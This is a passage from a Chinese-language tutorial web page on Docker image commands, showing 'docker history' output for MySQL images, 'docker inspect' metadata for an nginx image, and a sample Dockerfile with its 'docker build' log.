class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs leaf">➜  /tmp docker history mysql<br>IMAGE          CREATED        CREATED BY                                      SIZE      COMMENT<br>de7c37d1d5ac   6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  CMD [&quot;mysqld&quot;]               0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  EXPOSE 3306 33060            0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENTRYPOINT [&quot;docker-entry…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span> COPY file:e9c22353a1133b89…   14.2kB    <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  VOLUME [/var/lib/mysql]      0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eux;  microdnf install -y &quot;m…   282MB     <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_SHELL_VERSION=8…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eu;  . /etc/os-release;  &#123;  …   215B      <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eux;  microdnf install -y &quot;m…   183MB     <br>&lt;missing&gt;      6 months ago   /bin/sh -c set -eu;  . /etc/os-release;  &#123;  …   246B      <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_VERSION=8.1.0-1…   0B        <br>&lt;missing&gt;      6 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV MYSQL_MAJOR=innovation   0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  key=&#x27;859BE8D7C586F5384…   3.17kB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  microdnf install -y   …   14.1MB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  arch=&quot;$(uname -m)&quot;;  c…   2.4MB     <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  ENV GOSU_VERSION=1.16        0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c set -eux;  groupadd --system --gi…   2.77kB    <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span>  CMD [&quot;/bin/bash&quot;]            0B        <br>&lt;missing&gt;      7 months ago   /bin/sh -c <span class="hljs-punctuation">#</span><span class="hljs-params">(<span class="hljs-variable">nop</span>)</span> ADD file:49b1f7f2b2558f789…   118MB     <br></code></pre></td></tr></table></figure><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs nix">➜  <span class="hljs-symbol">/tmp</span> docker history mysql:<span class="hljs-number">8.3</span>.<span class="hljs-number">0</span><br>IMAGE          CREATED       CREATED BY                                      SIZE      COMMENT<br>e68e2614955c   <span class="hljs-number">5</span> weeks ago   CMD [<span class="hljs-string">&quot;mysqld&quot;</span>]                                  <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   EXPOSE <span class="hljs-built_in">map</span>[<span class="hljs-number">3306</span><span class="hljs-operator">/</span>tcp:&#123;&#125; <span class="hljs-number">33060</span><span class="hljs-operator">/</span>tcp:&#123;&#125;]            <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   ENTRYPOINT [<span class="hljs-string">&quot;docker-entrypoint.sh&quot;</span>]             <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   COPY docker-entrypoint.sh <span class="hljs-operator">/</span>usr<span class="hljs-operator">/</span>local<span class="hljs-operator">/</span>bin<span class="hljs-symbol">/</span> <span class="hljs-comment"># …   13.5kB    buildkit.dockerfile.v0</span><br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   VOLUME [<span class="hljs-operator">/</span>var<span class="hljs-operator">/</span>lib<span class="hljs-operator">/</span>mysql]                         <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   RUN <span class="hljs-symbol">/bin/sh</span> <span class="hljs-operator">-</span>c set <span class="hljs-operator">-</span>eux;  microdnf install <span class="hljs-operator">-</span>…   <span class="hljs-number">303</span>MB     buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   ENV MYSQL_SHELL_VERSION<span class="hljs-operator">=</span><span class="hljs-number">8.3</span>.<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">1</span>.el8             <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   RUN <span class="hljs-symbol">/bin/sh</span> <span class="hljs-operator">-</span>c set <span class="hljs-operator">-</span>eu;  &#123;   echo &#x27;[mysql-to…   <span class="hljs-number">226</span>B      buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   RUN <span class="hljs-symbol">/bin/sh</span> <span class="hljs-operator">-</span>c set <span class="hljs-operator">-</span>eux;  microdnf install <span class="hljs-operator">-</span>…   <span class="hljs-number">197</span>MB     buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   RUN <span class="hljs-symbol">/bin/sh</span> <span class="hljs-operator">-</span>c set <span class="hljs-operator">-</span>eu;  &#123;   echo &#x27;[mysqlinn…   <span class="hljs-number">246</span>B      buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   ENV MYSQL_VERSION<span class="hljs-operator">=</span><span class="hljs-number">8.3</span>.<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">1</span>.el8                   <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   ENV MYSQL_MAJOR<span class="hljs-operator">=</span>innovation                      <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   RUN <span class="hljs-symbol">/bin/sh</span> <span class="hljs-operator">-</span>c set <span class="hljs-operator">-</span>eux;  <span class="hljs-attr">key</span><span class="hljs-operator">=</span>&#x27;BCA4 <span class="hljs-number">3417</span> C3B…   <span class="hljs-number">3.17</span>kB    buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   RUN <span class="hljs-symbol">/bin/sh</span> <span class="hljs-operator">-</span>c set <span class="hljs-operator">-</span>eux;  microdnf install <span class="hljs-operator">-</span>…   <span class="hljs-number">14</span>MB      buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   RUN <span class="hljs-symbol">/bin/sh</span> <span class="hljs-operator">-</span>c set <span class="hljs-operator">-</span>eux;  <span class="hljs-attr">arch</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;$(uname -m)&quot;</span>…   <span class="hljs-number">2.4</span>MB     buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   ENV GOSU_VERSION<span class="hljs-operator">=</span><span class="hljs-number">1.16</span>                           <span class="hljs-number">0</span>B        buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   RUN <span class="hljs-symbol">/bin/sh</span> <span class="hljs-operator">-</span>c set <span class="hljs-operator">-</span>eux;  groupadd <span class="hljs-operator">-</span>-system …   <span class="hljs-number">2.77</span>kB    buildkit.dockerfile.v0<br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   <span class="hljs-symbol">/bin/sh</span> <span class="hljs-operator">-</span>c <span class="hljs-comment">#(nop)  CMD [&quot;/bin/bash&quot;]            0B        </span><br><span class="hljs-symbol">&lt;missing&gt;</span>      <span class="hljs-number">5</span> weeks ago   <span class="hljs-symbol">/bin/sh</span> <span class="hljs-operator">-</span>c <span class="hljs-comment">#(nop) ADD file:53c58659a3a149d31…   122MB   </span><br></code></pre></td></tr></table></figure><h2 id="查看镜像元数据"><a href="#查看镜像元数据" class="headerlink" title="查看镜像元数据"></a>查看镜像元数据</h2><h3 id="docker-inspect"><a href="#docker-inspect" class="headerlink" title="docker inspect"></a>docker inspect</h3><p><strong>docker inspect [OPTIONS] Name|Id</strong></p><h4 id="描述-5"><a href="#描述-5" class="headerlink" title="描述"></a>描述</h4><p>查看镜像的基础数据</p><h4 id="OPTIONS-3"><a href="#OPTIONS-3" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="f"><a href="#f" class="headerlink" title="-f"></a>-f</h5><p>指定返回值的模版文件，类似 docker inspect –format</p><h4 id="实例-4"><a href="#实例-4" class="headerlink" title="实例"></a>实例</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">➜  /tmp docker images <span class="hljs-string">| grep nginx</span><br>nginx                     latest       eeb9db34b331   <span class="hljs-number">2</span> years ago     <span class="hljs-number">134</span>MB<br></code></pre></td></tr></table></figure><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><code class="hljs nix">➜  <span class="hljs-symbol">/tmp</span> docker inspect nginx<br>[<br>    &#123;<br>        <span class="hljs-string">&quot;Id&quot;</span>: <span class="hljs-string">&quot;sha256:eeb9db34b33190cac170b27d857e9b23511d396a2609c1a54e93025634afed0a&quot;</span>,<br>        <span class="hljs-string">&quot;RepoTags&quot;</span>: [<br>            <span class="hljs-string">&quot;nginx:latest&quot;</span><br>        ],<br>        <span class="hljs-string">&quot;RepoDigests&quot;</span>: [<br>            <span class="hljs-string">&quot;nginx@sha256:0d17b565c37bcbd895e9d92315a05c1c3c9a29f762b011a10c54a66cd53c9b31&quot;</span><br>        ],<br>        <span class="hljs-string">&quot;Parent&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;Comment&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;Created&quot;</span>: <span class="hljs-string">&quot;2021-12-29T18:45:32.26799474Z&quot;</span>,<br>        <span class="hljs-string">&quot;Container&quot;</span>: <span class="hljs-string">&quot;28117e6cd07462919e64874c17cec15a453e5b3d99b088f04a12a7640c27c280&quot;</span>,<br>        <span class="hljs-string">&quot;ContainerConfig&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Hostname&quot;</span>: <span class="hljs-string">&quot;28117e6cd074&quot;</span>,<br>            <span class="hljs-string">&quot;Domainname&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;User&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;AttachStdin&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStdout&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStderr&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;ExposedPorts&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;80/tcp&quot;</span>: &#123;&#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;Tty&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;OpenStdin&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;StdinOnce&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Env&quot;</span>: [<br>                <span class="hljs-string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>,<br>                <span class="hljs-string">&quot;NGINX_VERSION=1.21.5&quot;</span>,<br>                <span class="hljs-string">&quot;NJS_VERSION=0.7.1&quot;</span>,<br>                <span class="hljs-string">&quot;PKG_RELEASE=1~bullseye&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Cmd&quot;</span>: [<br>                <span class="hljs-string">&quot;/bin/sh&quot;</span>,<br>                <span class="hljs-string">&quot;-c&quot;</span>,<br>                <span class="hljs-string">&quot;#(nop) &quot;</span>,<br>                <span class="hljs-string">&quot;CMD [<span class="hljs-char escape_">\&quot;</span>nginx<span class="hljs-char escape_">\&quot;</span> <span class="hljs-char escape_">\&quot;</span>-g<span class="hljs-char escape_">\&quot;</span> <span class="hljs-char escape_">\&quot;</span>daemon off;<span class="hljs-char escape_">\&quot;</span>]&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Image&quot;</span>: <span class="hljs-string">&quot;sha256:86f0ad4f760522a77d5d2748709f102fba21b448831ba769d6b5bee6bc8b15e7&quot;</span>,<br>            <span class="hljs-string">&quot;Volumes&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;WorkingDir&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Entrypoint&quot;</span>: [<br>                <span class="hljs-string">&quot;/docker-entrypoint.sh&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;OnBuild&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;Labels&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;maintainer&quot;</span>: <span class="hljs-string">&quot;NGINX Docker Maintainers &lt;docker-maint@nginx.com&gt;&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;StopSignal&quot;</span>: <span class="hljs-string">&quot;SIGQUIT&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;DockerVersion&quot;</span>: <span class="hljs-string">&quot;20.10.7&quot;</span>,<br>        <span class="hljs-string">&quot;Author&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-string">&quot;Config&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Hostname&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Domainname&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;User&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;AttachStdin&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStdout&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStderr&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;ExposedPorts&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;80/tcp&quot;</span>: &#123;&#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;Tty&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;OpenStdin&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;StdinOnce&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Env&quot;</span>: [<br>                <span class="hljs-string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>,<br>                <span class="hljs-string">&quot;NGINX_VERSION=1.21.5&quot;</span>,<br>                <span class="hljs-string">&quot;NJS_VERSION=0.7.1&quot;</span>,<br>                <span class="hljs-string">&quot;PKG_RELEASE=1~bullseye&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Cmd&quot;</span>: [<br>                <span class="hljs-string">&quot;nginx&quot;</span>,<br>                <span class="hljs-string">&quot;-g&quot;</span>,<br>                <span class="hljs-string">&quot;daemon off;&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Image&quot;</span>: <span class="hljs-string">&quot;sha256:86f0ad4f760522a77d5d2748709f102fba21b448831ba769d6b5bee6bc8b15e7&quot;</span>,<br>            <span class="hljs-string">&quot;Volumes&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;WorkingDir&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Entrypoint&quot;</span>: [<br>                <span class="hljs-string">&quot;/docker-entrypoint.sh&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;OnBuild&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;Labels&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;maintainer&quot;</span>: <span class="hljs-string">&quot;NGINX Docker Maintainers &lt;docker-maint@nginx.com&gt;&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;StopSignal&quot;</span>: <span class="hljs-string">&quot;SIGQUIT&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;Architecture&quot;</span>: <span class="hljs-string">&quot;arm64&quot;</span>,<br>        <span class="hljs-string">&quot;Variant&quot;</span>: <span class="hljs-string">&quot;v8&quot;</span>,<br>        <span class="hljs-string">&quot;Os&quot;</span>: <span class="hljs-string">&quot;linux&quot;</span>,<br>        <span class="hljs-string">&quot;Size&quot;</span>: <span class="hljs-number">134458357</span>,<br>        <span class="hljs-string">&quot;VirtualSize&quot;</span>: <span class="hljs-number">134458357</span>,<br>        <span class="hljs-string">&quot;GraphDriver&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Data&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;LowerDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/19bce005f2b1d9db0eba7c613875f51cd1b7a19ea0a43dcbf45c1017fbcc03dc/diff:/var/lib/docker/overlay2/2949cec29c3a2dfba7a1cbc215919f6ec18a27e80506dbbc51017f4389bb604e/diff:/var/lib/docker/overlay2/8f23aefbf0d9446e0dd6f9d228bdd2ed21b4b556d064352cdb546407fbe22b7b/diff:/var/lib/docker/overlay2/aba312ecee136814284e1d21b2d4f6c28cdabb85ee4d3142324ae752156359ac/diff:/var/lib/docker/overlay2/3db4264e94b91b2dac969fd2a0af7317aeb303e8d0032162e2e4734c05b750c9/diff&quot;</span>,<br>                <span class="hljs-string">&quot;MergedDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/13e56f4f1a8dc5bf18857bdf279ce0d20b730534c8b5027eafe142cf28e36a95/merged&quot;</span>,<br>                <span class="hljs-string">&quot;UpperDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/13e56f4f1a8dc5bf18857bdf279ce0d20b730534c8b5027eafe142cf28e36a95/diff&quot;</span>,<br>                <span class="hljs-string">&quot;WorkDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/13e56f4f1a8dc5bf18857bdf279ce0d20b730534c8b5027eafe142cf28e36a95/work&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;Name&quot;</span>: <span class="hljs-string">&quot;overlay2&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;RootFS&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Type&quot;</span>: <span class="hljs-string">&quot;layers&quot;</span>,<br>            <span class="hljs-string">&quot;Layers&quot;</span>: [<br>                <span class="hljs-string">&quot;sha256:1c79be3b9cebb9838b5c607567cb18eb50cd94e39b20a6241ca7d2d53dcffc89&quot;</span>,<br>                <span class="hljs-string">&quot;sha256:c6652321c7b9deb69994b5490710e7ab52a38f5171eddbe6f4d47fb9ea928929&quot;</span>,<br>                <span class="hljs-string">&quot;sha256:d00df4ca0725daf0ad547fcc9c731ed877d7b898559703ffe94e35de77ebd455&quot;</span>,<br>                <span class="hljs-string">&quot;sha256:eb5d612bd5e0648b5dd9680101b778787652f435ac73db4b5e559b868392a314&quot;</span>,<br>                <span class="hljs-string">&quot;sha256:01792ec538b3b8d67d341ad7b079beec9b289feb8a1e618b3fcfe2bb0c206a2b&quot;</span>,<br>                <span class="hljs-string">&quot;sha256:7bc89178e1bbe5212cc907f798b0f3bb3e07c71083390703e04486012d398a4f&quot;</span><br>            ]<br>        &#125;,<br>        <span class="hljs-string">&quot;Metadata&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;LastTagTime&quot;</span>: <span class="hljs-string">&quot;0001-01-01T00:00:00Z&quot;</span><br>        &#125;<br>    &#125;<br>]<br></code></pre></td></tr></table></figure><h2 id="生成镜像"><a href="#生成镜像" class="headerlink" title="生成镜像"></a>生成镜像</h2><h3 id="docker-build"><a href="#docker-build" class="headerlink" title="docker build"></a>docker build</h3><p><strong>docker build [OPTIONS] PATH | URL | -</strong></p><h4 id="描述-6"><a href="#描述-6" class="headerlink" title="描述"></a>描述</h4><p>已有的镜像不能满足业务需求，需要自己构建符合需求的镜像</p><h4 id="OPTIONS-4"><a href="#OPTIONS-4" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="t"><a href="#t" class="headerlink" title="-t"></a>-t</h5><p>–tag list</p><p>–target string  指定镜像 tag</p><h4 id="PATH"><a href="#PATH" class="headerlink" title="PATH"></a>PATH</h4><p>指定 Dockerfile 路径</p><h4 id="实例-5"><a href="#实例-5" class="headerlink" title="实例"></a>实例</h4><h5 id="编写-Dockerfile-文件"><a href="#编写-Dockerfile-文件" class="headerlink" title="编写 Dockerfile 文件"></a>编写 Dockerfile 文件</h5><p>注意：文件名就是Dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">➜  test cat Dockerfile <br><span class="hljs-comment"># 使用官方的 Ubuntu 20.04 镜像作为基础</span><br><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">20.04</span><br><br><span class="hljs-comment"># 作者信息</span><br><span class="hljs-keyword">LABEL</span><span class="language-bash"> maintainer=<span class="hljs-string">&quot;your-email@example.com&quot;</span></span><br><br><span class="hljs-comment"># 更新 apt 软件包列表并安装一个示例应用程序</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get install -y \</span><br><span class="language-bash">    nginx \</span><br><span class="language-bash">    &amp;&amp; <span class="hljs-built_in">rm</span> -rf /var/lib/apt/lists/*</span><br><br><span class="hljs-comment"># 将本地文件复制到镜像中</span><br><span class="hljs-keyword">COPY</span><span class="language-bash"> index.html /var/www/html/</span><br><br><span class="hljs-comment"># 暴露端口</span><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">80</span><br><br><span class="hljs-comment"># 定义容器启动时运行的命令</span><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;nginx&quot;</span>, <span class="hljs-string">&quot;-g&quot;</span>, <span class="hljs-string">&quot;daemon off;&quot;</span>]</span><br></code></pre></td></tr></table></figure><h5 id="build镜像"><a href="#build镜像" class="headerlink" title="build镜像"></a>build镜像</h5><p>docker build -t my-nginx-image .</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs ruby">➜  test docker build -t my-nginx-image .<br>[+] <span class="hljs-title class_">Building</span> <span class="hljs-number">74</span>.9s (<span class="hljs-number">8</span>/<span class="hljs-number">8</span>) <span class="hljs-variable constant_">FINISHED</span>                                                                                                                                           <br> =&gt; [internal] load build definition from <span class="hljs-title class_">Dockerfile</span>                                                                                                                   <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; transferring <span class="hljs-symbol">dockerfile:</span> 491B                                                                                                                                   <span class="hljs-number">0</span>.0s<br> =&gt; [internal] load .dockerignore                                                                                                                                      <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; transferring <span class="hljs-symbol">context:</span> 2B                                                                                                                                        <span class="hljs-number">0</span>.0s<br> =&gt; [internal] load metadata for docker.io/library/<span class="hljs-symbol">ubuntu:</span><span class="hljs-number">20.04</span>                                                                                                        <span class="hljs-number">1</span>.4s<br> =&gt; [<span class="hljs-number">1</span>/<span class="hljs-number">3</span>] <span class="hljs-variable constant_">FROM</span> docker.io/library/<span class="hljs-symbol">ubuntu:</span><span class="hljs-number">20.04</span><span class="hljs-variable">@sha256</span><span class="hljs-symbol">:</span>626ffe58f6e7566e00254b638eb7e0f3b11d4da9675088f4781a50ae288f3322                                                 <span class="hljs-number">23</span>.4s<br> =&gt; =&gt; resolve docker.io/library/<span class="hljs-symbol">ubuntu:</span><span class="hljs-number">20.04</span><span class="hljs-variable">@sha256</span><span class="hljs-symbol">:</span>626ffe58f6e7566e00254b638eb7e0f3b11d4da9675088f4781a50ae288f3322                                                  <span class="hljs-number">0</span>.0s<br> =&gt; =&gt; <span class="hljs-symbol">sha256:</span>626ffe58f6e7566e00254b638eb7e0f3b11d4da9675088f4781a50ae288f3322 <span class="hljs-number">1</span>.42kB / <span 